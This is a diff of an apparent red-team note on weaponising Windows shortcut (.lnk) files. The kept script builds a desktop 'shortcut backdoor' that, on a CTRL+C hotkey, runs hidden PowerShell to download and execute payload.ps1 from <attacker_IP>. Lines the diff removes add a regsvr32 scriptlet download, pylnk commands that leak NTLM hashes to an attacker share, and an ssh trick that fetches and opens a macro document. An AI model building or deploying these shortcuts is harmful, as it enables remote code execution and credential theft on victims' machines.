@@ -1,4 +1,4 @@
-# Living off the Land
+# Manual
 
 > [!INFO]
 > Windows shortcut link (`.lnk`) is often referred as **Shell Link**.
@@ -27,57 +27,14 @@ TODO: Remove timestamps in the .lnk file
 $WScriptShell = New-Object -ComObject WScript.Shell
 $ShortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
 $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
-$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
-$Shortcut.Arguments = '/c regsvr32.exe /s /n /u /i:http://<IP>/payload.sct scrobj.dll'
-# $Shortcut.TargetPath = 'conhost.exe'
-# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http[s]://<attacker_IP>/payload.ps1`'))`"`""
+$Shortcut.TargetPath = 'conhost.exe'
+$Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http[s]://<attacker_IP>/payload.ps1`'))`"`""
 $Shortcut.Description = "A shortcut backdoor"
-# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
 $Shortcut.IconLocation = 'shell32.dll,21'
 $Shortcut.HotKey = 'CTRL+C' # A hotkey to trigger the payload
 $Shortcut.WindowStyle = 7   # 1 - Normal, 3 - Maximized, 7 - Minimized
 $Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
 $Shortcut.Save()
-```
-
-## 03 - Use Cases
-
-### 3.1 - Hidden file
-
-```
-$ wine attrib.exe +h payload.ps1
-
-$ wine attrib.exe
-
-$ wine cmd.exe /c dir /a:h
-```
-
-```
-$ pylnk c C:\Windows\System32\conhost.exe -a "powershell.exe -ep bypass -f payload.ps1" shortcut_file.lnk
-```
-
-### 3.2 - Capture NTLM Relay
-
-```
-$ pylnk c \\<attacker_IP>\<share_name>\@snare.txt shortcut_file.lnk
-
-$ pylnk c \\<attacker_IP>\<share_name>\snare.txt shortcut_file.lnk
-```
-
-Scriptlet file
-
-```
-$ pylnk c C:\Windows\System32\regsvr32.exe -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" payload.lnk
-```
-
-```
-$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "\\<attacker_IP>\key.pem root@<IP>" payload.lnk
-```
-
-TODO: Provide use cases if any (refer to the link for SSH)
-
-```
-C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc" <username>@<attacker_IP>
 ```
 
 ---
@@ -96,8 +53,6 @@ C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand
 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Linux/C2 Frameworks|Metasploit: Web Delivery]]
 
 ### Source Repositories
-
-- [rvrsh3ll: Create-HotKeyLNK.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)
 
 - [nobodyatall648: Malicious LNK File Abuse Hotkey Feature](https://github.com/nobodyatall648/Malicious-LNK-File-Abuse-Hotkey-Feature)
 
